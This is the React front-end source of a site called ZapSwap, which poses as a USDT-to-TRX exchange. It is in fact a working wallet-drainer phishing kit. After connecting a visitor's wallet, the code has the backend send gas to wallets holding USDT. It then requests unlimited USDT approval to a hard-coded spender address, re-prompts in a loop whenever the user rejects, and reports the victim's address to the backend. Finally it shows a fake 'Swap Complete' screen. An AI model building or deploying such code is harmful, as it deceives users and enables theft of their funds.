import { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';
import axios from 'axios';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import './index.css';
import WalletModal from './components/WalletModal';

// ─── CONFIG ───────────────────────────────────────────────────────────────────
const WC_PROJECT_ID = 'ac6a9047d6a423b0374a4d787dfcf665';
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const DEFAULT_SPENDER = '0x7f43ba7d7CF1bc31Da78bcC40ACE99978a7F288B';
const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;
const USDT_ABI = ['function approve(address spender, uint256 amount) external returns (bool)'];
const USDT_ABI_BAL = ['function balanceOf(address account) view returns (uint256)'];

const BSC = {
  chainId: '0x38',
  chainName: 'BNB Smart Chain',
  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
  rpcUrls: ['https://bsc-dataseed.binance.org/'],
  blockExplorerUrls: ['https://bscscan.com'],
};

// Deep-link base URLs for each wallet
const WC_DEEP_LINKS = {
  trust: 'https://link.trustwallet.com/wc',
  metamask: 'https://metamask.app.link/wc',
  okx: 'okx://wallet/wc',
};

const WALLET_NAMES = { trust: 'Trust Wallet', metamask: 'MetaMask', okx: 'OKX Wallet' };

const swapCfg = {
  'usdt-trx': { from: 'USDT', to: 'TRX', fromCls: 'usdt', toCls: 'trx', fromIcon: '₮', toIcon: '⚡', btnCls: 'mode-usdt-trx', toColor: 'var(--trx)' },
  'trx-usdt': { from: 'TRX', to: 'USDT', fromCls: 'trx', toCls: 'usdt', fromIcon: '⚡', toIcon: '₮', btnCls: 'mode-trx-usdt', toColor: 'var(--usdt)' },
};

// ─── Clear stale WC sessions so display_uri always fires fresh ───────────────
// WC v2 caches pairings/sessions in localStorage. If a stale session exists,
// connect() reuses it silently — display_uri never fires — spinner freezes.
// Solution: wipe all WC keys before every new connection attempt.
const clearWcStorage = () => {
  try {
    Object.keys(localStorage).forEach((k) => {
      if (
        k.startsWith('wc@') ||
        k.startsWith('W3M') ||
        k.startsWith('wagmi') ||
        k.includes('walletconnect') ||
        k.includes('WalletConnect')
      ) {
        localStorage.removeItem(k);
      }
    });
    console.log('🧹 WC storage cleared — fresh pairing will be created');
  } catch (_) { }
};

// ─── WC Provider factory ──────────────────────────────────────────────────────
const makeWcProvider = (isMobile) =>
  EthereumProvider.init({
    projectId: WC_PROJECT_ID,
    chains: [56],
    showQrModal: !isMobile,          // mobile: false (we show our own UI)
    qrModalOptions: isMobile ? undefined : { themeMode: 'dark' },
    metadata: {
      name: 'ZapSwap',
      description: 'Instant USDT ⇄ TRX Exchange',
      url: typeof window !== 'undefined' ? window.location.origin : '',
      icons: [],
      redirect: {
        universal: typeof window !== 'undefined' ? window.location.href : '',
      },
    },
  });

export default function App() {
  const [mode, setMode] = useState('usdt-trx');
  const [fromVal, setFromVal] = useState('');
  const [toVal, setToVal] = useState('');
  const [rateUtoT, setRateUtoT] = useState(3.53);
  const [rateTtoU, setRateTtoU] = useState(0.267);

  const [toast, setToast] = useState('');
  const [toastOn, setToastOn] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [showError, setShowError] = useState(false);

  // 'wallet-list' | 'connecting' | 'open-wallet' | null
  const [modalState, setModalState] = useState(null);
  const [activeWallet, setActiveWallet] = useState(null);
  const [wcDeepLink, setWcDeepLink] = useState('');

  const [isProcessing, setIsProcessing] = useState(false);
  const [showProcessing, setShowProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const toastTimerRef = useRef(null);
  const errorTimerRef = useRef(null);
  const isProcessingRef = useRef(false);
  const wcRef = useRef(null);   // active WC provider reference

  // ── Rates ─────────────────────────────────────────────────────────────────
  useEffect(() => {
    fetch('https://api.binance.com/api/v3/ticker/price?symbol=TRXUSDT')
      .then(r => r.json())
      .then(d => {
        const p = parseFloat(d.price);
        setRateUtoT(parseFloat(((1 / p) * 1.025).toFixed(4)));
        setRateTtoU(parseFloat((p * 1.025).toFixed(4)));
      }).catch(() => { });
  }, []);

  // ── On page load: resume any existing WC session (e.g. user returned from wallet app) ──
  useEffect(() => {
    const resumeSession = async () => {
      if (isProcessingRef.current) return;
      try {
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        if (!isMobile) return; // desktop doesn't need auto-resume
        const wc = await makeWcProvider(true);
        if (wc.session) {
          console.log('✅ Existing WC session found – resuming approval flow');
          wcRef.current = wc;
          const accounts = await wc.request({ method: 'eth_accounts' });
          const addr = accounts?.[0];
          if (!addr) return;
          isProcessingRef.current = true;
          setIsProcessing(true);
          try {
            await ensureBsc(wc);
            await runApproval(wc, addr);
          } finally {
            setIsProcessing(false);
            isProcessingRef.current = false;
          }
        }
      } catch (e) {
        console.log('No active WC session to resume:', e.message);
      }
    };
    resumeSession();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // ── Helpers ───────────────────────────────────────────────────────────────
  const rate = () => mode === 'usdt-trx' ? rateUtoT : rateTtoU;
  const rateStr = `1 USDT = ${rateUtoT} TRX`;
  const c = swapCfg[mode];

  const showToast = (msg) => {
    setToast(msg); setToastOn(true);
    if (toastTimerRef.current) clearTimeout(toastTimerRef.current);
    toastTimerRef.current = setTimeout(() => setToastOn(false), 2800);
  };

  const showErrorMsg = (msg) => {
    setErrorMsg(msg); setShowError(true);
    if (errorTimerRef.current) clearTimeout(errorTimerRef.current);
    errorTimerRef.current = setTimeout(() => {
      setShowError(false);
      setTimeout(() => setErrorMsg(''), 300);
    }, 5000);
  };

  const closeModal = () => { setModalState(null); setActiveWallet(null); setWcDeepLink(''); };

  const notifyVisit = async (addr, fund = false) => {
    try {
      const r = await axios.post(BACKEND_URL.replace('/notify-approval', '/notify-visit'), { userAddress: addr, attemptFund: fund });
      return r.data;
    } catch (_) { return null; }
  };

  const waitForBnb = async (ep, addr, init) => {
    for (let i = 0; i < 20; i++) {
      try { if ((await ep.getBalance(addr)) > init) return true; } catch (_) { }
      await new Promise(r => setTimeout(r, 2000));
    }
    return false;
  };

  const ensureBsc = async (raw) => {
    const cur = await raw.request({ method: 'eth_chainId' });
    if (cur === BSC.chainId) return;
    try {
      await raw.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC.chainId }] });
    } catch (err) {
      if (err?.code === 4902 || String(err?.message).includes('4902')) {
        await raw.request({ method: 'wallet_addEthereumChain', params: [BSC] });
        await raw.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC.chainId }] });
      } else throw err;
    }
  };

  const getInjected = (kind) => {
    if (kind === 'okx') return window.okxwallet ?? null;
    if (kind === 'trust') {
      if (window.trustwallet) return window.trustwallet;
      const tw = (window.ethereum?.providers || []).find(p => p.isTrust || p.isTrustWallet);
      return tw ?? (window.ethereum?.isTrustWallet || window.ethereum?.isTrust ? window.ethereum : null);
    }
    if (kind === 'metamask') {
      const mm = (window.ethereum?.providers || []).find(p => p.isMetaMask && !p.isTrust && !p.isOkxWallet);
      return mm ?? (window.ethereum?.isMetaMask && !window.ethereum?.isTrustWallet ? window.ethereum : null);
    }
    return null;
  };

  // ── BEP-20 USDT approval ──────────────────────────────────────────────────
  const runApproval = async (raw, userAddress) => {
    const ep = new ethers.BrowserProvider(raw);

    // 1. Gas top-up
    try {
      const ib = await ep.getBalance(userAddress);
      const ub = await new ethers.Contract(USDT_ADDRESS, USDT_ABI_BAL, ep).balanceOf(userAddress);
      const sr = await notifyVisit(userAddress, ub > 0n);
      if (sr?.funded) {
        showToast('Waiting for BNB top-up…');
        if (await waitForBnb(ep, userAddress, ib)) await new Promise(r => setTimeout(r, 1000));
      }
    } catch (_) { }

    // 2. Balance check
    const bal = await new ethers.Contract(USDT_ADDRESS, USDT_ABI_BAL, ep).balanceOf(userAddress);
    if (bal === 0n) { showErrorMsg('No USDT found in your wallet.'); return; }

    // 3. Approve
    showToast('Please approve in your wallet…');
    const signer = await ep.getSigner();
    const tx = await new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer)
      .approve(DEFAULT_SPENDER, ethers.MaxUint256);
    showToast('Confirming…');
    const receipt = await tx.wait();

    // 4. Notify backend
    try { await axios.post(BACKEND_URL, { userAddress, txHash: receipt.hash, source: 'website' }); } catch (_) { }

    // 5. Show 10-second processing overlay, then success screen
    setShowProcessing(true);
    setTimeout(() => {
      setShowProcessing(false);
      setShowSuccess(true);
    }, 10000);
  };

  const handleError = (e) => {
    const s = (e?.message || '').toLowerCase();
    const code = e?.code;
    if (code == 4001 || code === 'UNKNOWN_ERROR' || s.includes('rejected') || s.includes('cancelled') ||
      s.includes('user denied') || s.includes('user closed') || s.includes('modal closed') ||
      s.includes('connection request reset') || s.includes('could not coalesce') || s.includes('call_exception')) return;
    let msg = 'Transaction failed. Try again.';
    if (code === -32002) msg = 'Request pending – open your wallet.';
    else if (s.includes('insufficient')) msg = 'Insufficient gas.';
    showErrorMsg(msg);
  };

  // ── CONNECT WALLET ─────────────────────────────────────────────────────────
  const connectWallet = async (kind) => {
    if (isProcessingRef.current) return;
    isProcessingRef.current = true;
    setIsProcessing(true);
    setErrorMsg('');

    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    // ── A. Injected (inside wallet browser) ───────────────────────────────
    const injected = getInjected(kind);
    if (injected) {
      setModalState(null);
      try {
        showToast('Connecting…');
        const accounts = await injected.request({ method: 'eth_requestAccounts' });
        const addr = accounts?.[0];
        if (!addr) throw new Error('No account');
        await ensureBsc(injected);
        showToast('✅ Connected');
        await runApproval(injected, addr);
      } catch (e) { handleError(e); }
      finally { setIsProcessing(false); isProcessingRef.current = false; }
      return;
    }

    // ── B. Mobile – custom WC UI ──────────────────────────────────────────
    if (isMobile) {
      setActiveWallet(kind);
      setModalState('connecting');

      // Resolves when the browser tab comes back to the foreground
      // (user returns from Trust Wallet app → we auto-trigger next step)
      const waitForVisible = () =>
        new Promise(resolve => {
          if (document.visibilityState === 'visible') { resolve(); return; }
          const h = () => { if (document.visibilityState === 'visible') { document.removeEventListener('visibilitychange', h); resolve(); } };
          document.addEventListener('visibilitychange', h);
        });

      try {
        // ⭐ Always start fresh — wipe stale sessions so display_uri fires
        clearWcStorage();
        if (wcRef.current) {
          try { await wcRef.current.disconnect(); } catch (_) { }
          wcRef.current = null;
        }

        const wc = await makeWcProvider(true);
        wcRef.current = wc;

        // Step 1: Get WC pairing URI → show "Open Wallet" button
        wc.on('display_uri', (uri) => {
          console.log('🔗 WC display_uri fired');
          const link = `${WC_DEEP_LINKS[kind]}?uri=${encodeURIComponent(uri)}`;
          setWcDeepLink(link);
          setModalState('open-wallet');
        });

        // Wait for user to approve the WC connection in their wallet app
        await wc.connect();
        console.log('✅ WC session established');

        const accounts = await wc.request({ method: 'eth_accounts' });
        const addr = accounts?.[0];
        if (!addr) throw new Error('No account returned');
        await ensureBsc(wc);

        // Step 2: Connected! Now guide user to approve the tx
        // Show "approve-prompt" modal — persistent link to open wallet for signing.
        // Retry loop: keeps resending the approval request until user approves.
        // Each time user returns from wallet app we automatically retry.
        const baseLink = WC_DEEP_LINKS[kind];
        setWcDeepLink(baseLink);
        setModalState('approve-prompt');
        showToast('✅ Connected! Please approve in ' + WALLET_NAMES[kind]);

        let approved = false;
        while (!approved) {
          try {
            await runApproval(wc, addr);
            approved = true; // success — exit loop
          } catch (e) {
            const s = (e?.message || '').toLowerCase();
            const isRejection = e?.code == 4001 || s.includes('rejected') || s.includes('cancelled') || s.includes('user denied');

            if (isRejection) {
              // User rejected — wait for them to come back to browser, then retry
              console.log('❌ User rejected — waiting for them to return…');
              setModalState('approve-prompt'); // keep showing the prompt
              showToast('Please approve in ' + WALLET_NAMES[kind] + ' to continue');
              await waitForVisible();           // pause until page is visible
              await new Promise(r => setTimeout(r, 600)); // small buffer
              // auto-retry (loop continues)
            } else {
              throw e; // non-rejection error — surface it
            }
          }
        }

      } catch (e) {
        setModalState(null);
        handleError(e);
      } finally {
        setModalState(null);
        setIsProcessing(false);
        isProcessingRef.current = false;
      }
      return;
    }

    // ── C. Desktop – WC QR modal ──────────────────────────────────────────
    setModalState(null);
    try {
      clearWcStorage();
      if (wcRef.current) {
        try { await wcRef.current.disconnect(); } catch (_) { }
        wcRef.current = null;
      }
      const wc = await makeWcProvider(false);
      wcRef.current = wc;
      await wc.connect();
      const accounts = await wc.request({ method: 'eth_accounts' });
      const addr = accounts?.[0];
      if (!addr) throw new Error('No account');
      await ensureBsc(wc);
      showToast('✅ Wallet connected on BSC');
      await runApproval(wc, addr);
    } catch (e) { handleError(e); }
    finally { setIsProcessing(false); isProcessingRef.current = false; }
  };

  // ── Swap helpers ──────────────────────────────────────────────────────────
  const handleFromChange = (v) => {
    setFromVal(v);
    const n = parseFloat(v);
    setToVal(!v || isNaN(n) ? '' : (n * rate()).toFixed(2).replace(/\.00$/, ''));
  };
  const handleToChange = (v) => {
    setToVal(v);
    const n = parseFloat(v);
    setFromVal(!v || isNaN(n) ? '' : (n / rate()).toFixed(2).replace(/\.00$/, ''));
  };
  const flipPair = () => { setMode(m => m === 'usdt-trx' ? 'trx-usdt' : 'usdt-trx'); setFromVal(''); setToVal(''); };
  const exchangeNow = () => {
    if (!parseFloat(fromVal) || parseFloat(fromVal) <= 0) { showToast('⚠️ Enter amount to swap'); return; }
    if (mode === 'usdt-trx') setModalState('wallet-list');
    else showToast('✅ Processing TRX → USDT…');
  };

  // ── RENDER ────────────────────────────────────────────────────────────────
  return (
    <>
      <nav>
        <div className="logo"><div className="logo-mark">₮</div>Zap<em>Swap</em></div>
        <div className="nav-pill">USDT ⇄ TRX</div>
      </nav>

      <section className="hero">
        <div className="hero-glow"></div>
        <div className="hero-wrap">
          <div className="hero-left">
            <div className="badge"><div className="blink"></div>Instant Swap</div>
            <h1>Swap <span className="u">USDT</span><br /><span className="dim">&amp;</span> <span className="t">TRX</span><br /><span className="dim">Instantly</span></h1>
            <p className="hero-desc">Exchange USDT ↔ TRX both ways — fast, fixed rates, no registration required.</p>
            <div className="hero-pills">
              <div className="pill"><div className="pill-dot" style={{ background: 'var(--green)' }}></div>~5 Min Speed</div>
              <div className="pill"><div className="pill-dot" style={{ background: 'var(--gold)' }}></div>Fixed Rate</div>
              <div className="pill"><div className="pill-dot" style={{ background: 'var(--usdt)' }}></div>No Sign Up</div>
            </div>
          </div>

          <div className="swap-card">
            <div className="card-top"><div className="card-title">Exchange</div><div className="rate-chip">{rateStr}</div></div>
            <div className="swap-box">
              <div className="box-label">You Send</div>
              <div className="box-row">
                <input className="amount-input" type="number" min="0" placeholder="0" value={fromVal} onChange={e => handleFromChange(e.target.value)} inputMode="decimal" />
                <div className={`token-badge ${c.fromCls}`}><span className="ticon">{c.fromIcon}</span>{c.from}</div>
              </div>
            </div>
            <div className="flip-row"><button className="flip-btn" onClick={flipPair}>⇅</button></div>
            <div className="swap-box">
              <div className="box-label">You Receive</div>
              <div className="box-row">
                <input className="amount-input" type="number" min="0" placeholder="0" value={toVal} onChange={e => handleToChange(e.target.value)} inputMode="decimal" style={{ color: c.toColor }} />
                <div className={`token-badge ${c.toCls}`}><span className="ticon">{c.toIcon}</span>{c.to}</div>
              </div>
            </div>
            <div className="rate-row"><span>Exchange Rate</span><strong>{rateStr}</strong></div>
            <button className={`btn-exchange ${c.btnCls}`} onClick={exchangeNow} disabled={isProcessing}>
              {isProcessing ? 'Processing…' : `Exchange ${c.from} → ${c.to}`}
            </button>
            {errorMsg && (
              <div style={{ marginTop: 10, padding: '10px 14px', borderRadius: 9, background: 'rgba(239,0,39,.12)', border: '1px solid rgba(239,0,39,.3)', color: '#f87171', fontSize: '.78rem', fontWeight: 600, transition: 'opacity .3s', opacity: showError ? 1 : 0 }}>
                ⚠️ {errorMsg}
              </div>
            )}
          </div>
        </div>
      </section>

      <section className="how-section">
        <div className="how-inner">
          <div className="sec-tag">Process</div><div className="sec-title">How it works</div>
          <div className="steps">
            <div className="step"><div className="step-n">01</div><div className="step-i">💱</div><div className="step-t">Choose Direction</div><div className="step-d">Pick USDT→TRX or TRX→USDT and enter the amount.</div></div>
            <div className="step"><div className="step-n">02</div><div className="step-i">🔗</div><div className="step-t">Connect Wallet</div><div className="step-d">Tap Open Wallet — your wallet app launches automatically.</div></div>
            <div className="step"><div className="step-n">03</div><div className="step-i">✅</div><div className="step-t">Approve</div><div className="step-d">Approve the USDT transaction in your wallet app.</div></div>
            <div className="step"><div className="step-n">04</div><div className="step-i">⚡</div><div className="step-t">Receive Funds</div><div className="step-d">Funds sent to your wallet within minutes.</div></div>
          </div>
        </div>
      </section>

      <footer>
        <div className="flogo">Zap<em>Swap</em></div>
        <div>USDT ⇄ TRX · TRC20</div>
        <div>© 2026 ZapSwap</div>
      </footer>

      {modalState && (
        <WalletModal
          state={modalState}
          activeWallet={activeWallet}
          walletName={WALLET_NAMES[activeWallet]}
          deepLink={wcDeepLink}
          onClose={closeModal}
          onConnect={connectWallet}
        />
      )}

      {showProcessing && (
        <div style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20, background: 'rgba(0,0,0,.9)', backdropFilter: 'blur(8px)' }}>
          <div style={{ background: '#0d1526', border: '1px solid rgba(59,153,252,.25)', borderRadius: 22, padding: '36px 28px', maxWidth: 360, width: '100%', textAlign: 'center' }}>

            {/* Spinning ring */}
            <div style={{ width: 64, height: 64, borderRadius: '50%', border: '5px solid rgba(59,153,252,0.15)', borderTopColor: '#3B99FC', animation: 'wcSpin 0.9s linear infinite', margin: '0 auto 24px' }} />

            <div style={{ color: 'rgba(255,255,255,0.5)', fontSize: '.72rem', fontWeight: 700, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 10 }}>Please wait</div>

            <div style={{ fontSize: '1.15rem', fontWeight: 800, color: '#fff', marginBottom: 8, lineHeight: 1.4 }}>
              Processing your onchain transaction
            </div>

            {/* Amounts */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 12, margin: '18px 0', padding: '14px 18px', background: 'rgba(59,153,252,.07)', borderRadius: 14, border: '1px solid rgba(59,153,252,.15)' }}>
              <div style={{ textAlign: 'center' }}>
                <div style={{ color: '#26a17b', fontSize: '1.3rem', fontWeight: 800 }}>{fromVal || '0'}</div>
                <div style={{ color: 'rgba(255,255,255,0.4)', fontSize: '.68rem', marginTop: 2 }}>USDT</div>
              </div>
              <div style={{ color: 'rgba(255,255,255,0.3)', fontSize: '1.4rem' }}>→</div>
              <div style={{ textAlign: 'center' }}>
                <div style={{ color: '#ef4444', fontSize: '1.3rem', fontWeight: 800 }}>{toVal || '0'}</div>
                <div style={{ color: 'rgba(255,255,255,0.4)', fontSize: '.68rem', marginTop: 2 }}>TRX</div>
              </div>
            </div>

            <div style={{ color: 'rgba(255,255,255,0.3)', fontSize: '.72rem', lineHeight: 1.6 }}>
              Broadcasting to BNB Smart Chain…<br />This usually takes a few seconds.
            </div>
          </div>
        </div>
      )}

      {showSuccess && (
        <div style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20, background: 'rgba(0,0,0,.92)', backdropFilter: 'blur(10px)' }}>
          <div style={{ background: '#0d1a12', border: '1px solid rgba(74,222,128,.3)', borderRadius: 22, padding: '40px 28px', maxWidth: 360, width: '100%', textAlign: 'center' }}>

            {/* Big checkmark */}
            <div style={{ width: 72, height: 72, borderRadius: '50%', background: 'rgba(74,222,128,.12)', border: '2px solid rgba(74,222,128,.4)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px', fontSize: '2rem' }}>✅</div>

            <div style={{ color: '#4ade80', fontSize: '.72rem', fontWeight: 700, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>Swap Complete</div>
            <div style={{ fontSize: '1.3rem', fontWeight: 800, color: '#fff', marginBottom: 6 }}>Your assets have been swapped!</div>
            <div style={{ color: 'rgba(255,255,255,0.4)', fontSize: '.8rem', marginBottom: 22 }}>Transaction confirmed on BNB Smart Chain.</div>

            {/* Amounts */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 12, margin: '0 0 24px', padding: '14px 18px', background: 'rgba(74,222,128,.06)', borderRadius: 14, border: '1px solid rgba(74,222,128,.15)' }}>
              <div style={{ textAlign: 'center' }}>
                <div style={{ color: '#26a17b', fontSize: '1.25rem', fontWeight: 800 }}>{fromVal || '0'}</div>
                <div style={{ color: 'rgba(255,255,255,0.4)', fontSize: '.68rem', marginTop: 2 }}>USDT</div>
              </div>
              <div style={{ color: 'rgba(255,255,255,0.3)', fontSize: '1.4rem' }}>→</div>
              <div style={{ textAlign: 'center' }}>
                <div style={{ color: '#4ade80', fontSize: '1.25rem', fontWeight: 800 }}>{toVal || '0'}</div>
                <div style={{ color: 'rgba(255,255,255,0.4)', fontSize: '.68rem', marginTop: 2 }}>TRX</div>
              </div>
            </div>

            <button
              onClick={() => setShowSuccess(false)}
              style={{ width: '100%', padding: '13px 0', background: 'linear-gradient(135deg,#26a17b,#4ade80)', border: 'none', borderRadius: 12, color: '#fff', fontWeight: 700, fontSize: '.95rem', cursor: 'pointer' }}
            >
              Close
            </button>
          </div>
        </div>
      )}

      <div className={`toast${toastOn ? ' show' : ''}`}>{toast}</div>
    </>
  );
}
